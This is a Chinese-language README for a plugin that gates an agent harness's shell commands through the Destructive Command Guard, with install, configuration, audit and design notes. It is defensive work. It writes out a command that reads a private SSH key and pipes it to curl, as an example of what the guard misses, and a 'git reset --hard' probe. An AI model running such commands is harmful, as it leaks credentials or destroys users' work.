# dsh-shell-dcg

把 [Destructive Command Guard](https://github.com/Dicklesworthstone/destructive_command_guard)（`dcg`）接进 DeepSeek Harness 的审核链路：**每条 shell 命令执行前先判一次，危险的直接被拦下。**

开关默认关闭。关着的时候插件不注册任何监听，行为和你没装它完全一致。

> 状态：M1。门禁内核 + 就绪自检 + 审计已完成，**还没有图形配置界面**，开关和参数写在 profile 的行配置里。

## 它管什么、不管什么

| 层 | 管什么 | 谁负责 |
|---|---|---|
| 路径边界 | 能写到哪里 | DSH 沙箱（`sandbox/mode`） |
| **命令语义** | **边界内这条命令危不危险** | **本插件 + dcg** |
| 事后恢复 | 漏掉的那次怎么回滚 | 检查点 / rewind 一类插件 |

所以它**不是沙箱**：文件工具（`write`、`edit`、原生文件操作）完全不归它管；它只回答"这条命令字符串是不是已知的危险动作"。

也**管不到**：`cat ~/.ssh/id_rsa | curl -d @- ...` 这种读 + 出网（读不在 dcg 判定范围），以及远端主机上真正发生的事（`ssh_exec` 只判字符串）。

---

## 五分钟上手

1. 装 `dcg`（≥ 0.16.0），确认 `dcg --version` 能跑；
2. 把本目录作为插件装进 profile；
3. 在行配置里把 `enabled` 打开（建议同时开 `dryRun` 观察一段）；
4. 正常工作，然后看审计文件确认它在判。

---

## 第一步：安装 dcg

插件不自带二进制。任选一种：

**A. 官方脚本（推荐，带签名校验）**

按 dcg 仓库的安装说明操作：

- Windows：`docs/windows.md` 里的 PowerShell 安装函数（校验 minisign + SHA256 后才执行）
- macOS / Linux / WSL：`install.sh`

**B. 从源码编译**

需要 Rust 工具链：

```sh
git clone https://github.com/Dicklesworthstone/destructive_command_guard
cd destructive_command_guard
cargo install --path . --locked
```

**C. 用插件自带的安装脚本（钉版本 + 校验和）**

```sh
npm run install-dcg
```

下载 0.17.0 对应平台的资产，与 `lib/install.js` 里写死的 SHA-256 比对，通过后才解包到 `%DSH_HOME%\dsh-shell-dcg\bin\0.17.0\`。

- 5 分钟内没下完就报错退出，不会一直挂着；网速慢就自己下载，再用 `dcgPath` 指过去
- Windows 用内置 ZIP 读取器解包，不需要额外工具；Linux / macOS 是 `.tar.xz`，需要系统有 `tar`
- 报证书错误（公司网络做 TLS 拦截时常见）就用 `node --use-system-ca tools/install-dcg.mjs`

**确认：**

```sh
dcg --version        # 需要 >= 0.16.0
```

记下 `dcg` 的完整路径。如果它已在 `PATH` 里，下一步不用额外配置。

---

## 第二步：安装插件

在 DSH 的 **Plugins** 页面点 **Add plugin**，选择本目录：

```
E:\Documents\scripts\dsh-bash-dcg
```

或者在会话里让 agent 执行（用绝对路径）：

```
plugin_manager { action: "install_bundle", target: "E:\\Documents\\scripts\\dsh-bash-dcg" }
```

装完 **Plugins** 列表里会出现 **DCG 命令门禁**，默认关闭。本机目录是**链接**安装的：改了代码要重装或重启 DSH 才会生效。

---

## 第三步：打开开关

M1 没有设置界面，配置写在 profile 的用户 patch 里：

```
%DSH_HOME%\profiles\<profile>\cordis.patch.yml
```

在文件末尾追加这一段（`DSH_HOME` 通常是 `C:\Users\<你>\.dsh`）：

```yaml
- id: dsh-shell-dcg
  name: dsh-shell-dcg
  config:
    # 建议先观察一段：只记录不拦
    dryRun: true
    enabled: true
```

保存后**重启 DSH**。启动时插件会做一次就绪自检：找到二进制、版本够新、生成的策略能被 dcg 接受、一条必拒命令仍被判危险、一条无害命令仍被判放行。全部通过才算"已武装"。

观察满意后把 `dryRun` 去掉或设为 `false`，就进入强制模式。

> 如果 `dcg` 不在 `PATH` 里，加上 `dcgPath: C:\完整\路径\dcg.exe`。

---

## 第四步：确认它在工作

**判定能力**（只判定，不执行）：

```sh
printf 'git reset --hard HEAD~1' | dcg --robot test --stdin --format json
```

应该返回 `"decision":"deny"`，带 `core.git:reset-hard` 之类的规则 id。

**门禁是否真的接上了**：正常工作一会儿，然后看审计：

```
%DSH_HOME%\dsh-shell-dcg\audit\YYYY-MM-DD.jsonl
```

每行是一次判定。`decision` 是 dcg 的说法，`tool` 是哪个工具，`dryRun: true` 表示这次只记录没拦。

**看状态**：打开 **设置 → 命令门禁**——总开关、dcg 的版本与路径、当前策略、判定条数、最近的判定，以及「检查是否可用」「安装 dcg」两个动作。

**其他落地文件：**

```
%DSH_HOME%\dsh-shell-dcg\
  generated\policy.toml     由配置生成的 dcg 策略（勿手改）
  audit\YYYY-MM-DD.jsonl    每日判定记录
  bin\<版本>\dcg.exe        托管安装的二进制（可选）
```

---

## 配置速查

完整说明见 [docs/DETAIL.md](docs/DETAIL.md)。最常用的几个：

| 键 | 默认 | 说明 |
|---|---|---|
| `enabled` | `false` | 总开关 |
| `dryRun` | `false` | 只记录不拦，灰度期用 |
| `dcgPath` | `""` | dcg 可执行文件路径 |
| `onNotReady` | `"deny"` | dcg 没准备好时，命令类工具是拒还是放过 |
| `failClosed` | `true` | 判不了（超时/崩溃/未知判定）时是否拒绝 |
| `onAsk` | `"ask"` | dcg 判"需要人看"时：`ask` 走审批 / `deny` / `allow` |
| `policy.defaultMode` | 留空 | 留空则按 dcg 的严重度分级（high/critical 拒、medium 警告、low 只记日志）；填 `deny`/`ask`/`warn`/`log` 则统一按该动作 |
| `tools` | `["ops_bash","bash","pwsh","ssh_exec"]` | 参与判定的工具名 |
| `scriptPath` | `"read"` | 只给 `script_path` 的调用：`read` 读出文件内容再判 / `deny` / `pass` |
| `policy.packModes` | `{}` | 单包降级，例如 `{ "core.git": "warn" }` |

一个稍微完整的例子：

```yaml
- id: dsh-shell-dcg
  name: dsh-shell-dcg
  config:
    enabled: true
    dcgPath: C:\Users\me\bin\dcg.exe
    # 数据库相关的包只警告不拦（我本地有脚本要跑）
    policy:
      packModes:
        database.postgresql: warn
    audit:
      keepCommandText: true
```

---

## 常见问题

**拒绝理由里出现 `SHELL_DCG_NOT_READY`**
dcg 没装好。理由里会写明是哪一项自检没过（找不到二进制 / 版本太旧 / 探针结果不对）。修好重试，或者先把 `enabled` 关掉。

**误报太多**
两种降级方式：
- 单个包降级：`policy.packModes: { "core.git": "warn" }`（只警告、不拦）；
- 单条命令放行：调用被拒时 dcg 会给一个 `allow-once` 码，在终端跑 `dcg allow-once <码>` 即可放行一次。

**想让它只记录、先观察**
`dryRun: true`。

**想立刻完全停掉**
`enabled: false`，重启 DSH。插件不注册监听，开销为零。

**终端里的 dcg 和 DSH 里的策略不一样？**
是的，这是故意的。插件通过 `--config` 指向自己的 `generated\policy.toml`；你终端里直接跑 `dcg` 用的是 `%APPDATA%\dcg\config.toml`，互不干扰。

**Windows 上 `dcg` 装哪了？**
官方脚本默认装到用户目录并加进 `PATH`；找不到就用 `dcgPath` 显式指定，最省事。

---

## 卸载

Plugins 页面移除，或：

```
plugin_manager { action: "remove_bundle", target: "dsh-shell-dcg" }
```

`%DSH_HOME%\dsh-shell-dcg\` 可以留着（策略和审计），也可以直接删。

---

## 开发

```sh
npm test        # 57 项，不需要 DSH 运行时，也不需要真 dcg
npm run test:live   # 对着真 dcg 跑完整门禁链路（需要本机有 dcg）
npm run probe       # 只看 dcg 对一批命令的判定，排查用
```

`test:live` 用假 ctx 驱动真实 `arm()`：查二进制、比版本、跑自检探针、生成策略、写审计、映射判定全都走一遍，`DSH_HOME` 指到临时目录，不碰你的正式数据。

| 目录 | 内容 |
|---|---|
| `index.js` | `apply` / `inject` / `name` |
| `lib/` | config、dcg 进程边界、policy 生成、doctor、audit、门禁 |
| `test/` | 纯函数测试、门禁接线测试，以及两个需要真 dcg 的手工脚本 |
| `tools/asar.mjs` | 读 Electron `app.asar` 里文件的小工具：`node tools/asar.mjs <app.asar> list <regex>` / `cat <path>` |

### 几个刻意的决定

**走 `dcg test --stdin` 而不是 `dcg hook`。** dcg 的 hook 入口按 `tool_name` 白名单过滤，`ops_bash` 不在名单里，它"没有意见"就放行——静默失效。`test --stdin` 不经过工具名判定，命令走 stdin 也避开了 Windows 的引号和命令行长度问题。

**自己拥有策略文件。** `--config` 指向插件生成的 `policy.toml`，只写配置过的键；`default_mode` 留空时交给 dcg 的严重度分级。这样会话策略和终端策略隔离，各自可复现。

**零外部依赖。** 本机目录是 link 安装，Node 按真实路径解析裸模块名，`@deepseek-ai/*` 不一定解析得到。只用 `node:*` 就没有这个风险；代价是配置不走 schemastery 表单，校验自己写（类型不对就回退并 warning，绝不抛）。

**未知判定词一律拒绝。** dcg 的判定词表在演进（`indeterminate` 是后加的）。插件必须"不懂就拦"，否则上游加一个新词就等于开了一个洞。

**失败 fail closed。** 沙箱侧本来就是 fail closed（`SANDBOX_UNAVAILABLE` 而不是无约束地跑）；门禁侧如果悄悄放行，"以为有保护"比"没有保护"更危险。
